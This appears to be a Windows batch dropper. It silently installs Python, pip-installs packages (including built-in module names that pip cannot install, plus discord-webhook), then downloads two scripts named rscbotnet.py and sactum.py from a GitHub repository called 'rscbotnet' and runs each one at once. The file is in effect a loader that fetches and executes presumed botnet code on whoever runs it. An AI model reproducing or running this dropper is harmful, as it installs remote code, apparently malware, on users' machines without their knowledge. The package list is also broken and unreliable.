@echo off
python --version >nul 2>&1
if %errorlevel% neq 0 (
    set PYTHON_INSTALLER=python-3.11.6-amd64.exe
    curl -O https://www.python.org/ftp/python/3.11.6/%PYTHON_INSTALLER%
    if exist %PYTHON_INSTALLER% (
        start /wait %PYTHON_INSTALLER% /quiet InstallAllUsers=1 PrependPath=1
        del %PYTHON_INSTALLER%
    ) else (
        exit /b 1
    )
)

pip --version >nul 2>&1
if %errorlevel% neq 0 (
    python -m ensurepip --upgrade
    if %errorlevel% neq 0 (
        exit /b 1
    )
)

pip install os sys threading random socket requests re time subprocess socket discord-webhook
if %errorlevel% neq 0 (
    exit /b 1
)

set REPO_URL_RSCBOTNET=https://raw.githubusercontent.com/Porlius/rscbotnet/main/rscbotnet.py
curl -O %REPO_URL_RSCBOTNET%
if exist rscbotnet.py (
    python rscbotnet.py
) else (
    exit /b 1
)

set REPO_URL_SACTUM=https://raw.githubusercontent.com/Porlius/rscbotnet/main/sactum.py
curl -O %REPO_URL_SACTUM%
if exist sactum.py (
    python sactum.py
) else (
    exit /b 1
)

exit /b 0
